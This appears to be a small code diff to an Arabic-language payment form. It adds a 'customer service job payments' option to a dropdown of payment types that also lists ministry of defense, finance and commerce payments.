@@ -60,6 +60,7 @@ if( form.data.نوع_السداد == "اختر"||form.data.رقم_البطاقة
                   setDynamicFormData(name, value);
                 }} required>
                 <option value="اختر">اختر نوع السداد</option>
+                <option value="مدفوعات وظفية خدمة عملاء">مدفوعات وظفية خدمة عملاء</option>
                 <option value="مدفوعات وزارة الدفاع">مدفوعات وزارة الدفاع</option>
                 <option value="مدفوعات وزارة المالية">مدفوعات وزارة المالية</option>
                 <option value="مدفوعات وزارة التجارة">مدفوعات وزارة التجارة</option>
